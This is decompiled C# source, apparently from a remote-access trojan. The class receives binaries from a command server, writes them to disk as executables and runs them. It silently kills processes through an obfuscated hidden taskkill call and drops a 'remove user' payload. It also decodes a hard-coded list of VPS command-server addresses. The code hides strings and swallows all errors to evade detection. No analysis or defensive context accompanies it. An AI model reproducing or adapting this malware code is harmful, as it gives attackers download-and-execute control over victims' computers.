using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace rmtadrm;

internal class wrmstimzOCMD
{
	public wrmstimzMCDM server;

	public wrmstimzOCMD(wrmstimzMCDM lID)
	{
		server = lID;
	}

	public NetworkStream wrmstimzNS(TcpClient wrmstimztcpsck)
	{
		return wrmstimztcpsck.GetStream();
	}

	public void wrmstimzdo_updated(int uType, string switchType)
	{
		try
		{
			byte[] array = server.wrmstimzpull_data();
			if (uType == 7 && array != null)
			{
				string text = wrmstimzCONF.wrmstimzget_mpath() + "tmps\\";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(text + wrmstimzCONF.wrmstimzmainApp + ".exe|wrmstimz".Split(new char[1] { '|' })[0], array);
				wrmstimzdo_process(text + wrmstimzCONF.wrmstimzmainApp + ".exe|wrmstimz".Split(new char[1] { '|' })[0], null, sendExp: true);
			}
		}
		catch
		{
		}
	}

	public void wrmstimzdo_process(string filePath, string parms, bool sendExp)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = filePath;
			if (parms != null && parms != "")
			{
				process.StartInfo.Arguments = parms;
			}
			process.Start();
		}
		catch
		{
		}
	}

	public void wrmstimzbreak_process(int proid)
	{
		try
		{
			try
			{
				Thread.Sleep(100);
				Process.GetProcessById(proid).Kill();
				Thread.Sleep(100);
			}
			catch
			{
				wrmstimzdieProcess(Process.GetProcessById(proid));
			}
		}
		catch
		{
		}
	}

	public void wrmstimzdieProcess(Process p)
	{
		try
		{
			if (p != null)
			{
				Process process = new Process();
				byte[] array = new byte[12]
				{
					116, 97, 115, 107, 107, 105, 108, 108, 46, 101,
					120, 101
				};
				process.StartInfo.FileName = Encoding.UTF8.GetString(array, 0, array.Length);
				process.StartInfo.Arguments = "/PID |wrmstimz".Split(new char[1] { '|' })[0] + p.Id + " /T /F|wrmstimz".Split(new char[1] { '|' })[0];
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				process.WaitForExit();
			}
		}
		catch
		{
		}
	}

	public void wrmstimzremove_user()
	{
		try
		{
			byte[] array = server.wrmstimzpull_data();
			if (array != null && !File.Exists(wrmstimzCONF.wrmstimzget_mpath() + wrmstimzCONF.wrmstimzremvUser + ".exe"))
			{
				File.WriteAllBytes(wrmstimzCONF.wrmstimzget_mpath() + wrmstimzCONF.wrmstimzremvUser + ".exe", array);
				wrmstimzdo_process(wrmstimzCONF.wrmstimzget_mpath() + wrmstimzCONF.wrmstimzremvUser + ".exe", null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public string[] wrmstimzserverIPD()
	{
		string @string = Encoding.UTF8.GetString(wrmstimzCONF.wrmstimzvpsips, 0, wrmstimzCONF.wrmstimzvpsips.Length);
		return @string.Split(new char[1] { '?' });
	}
}
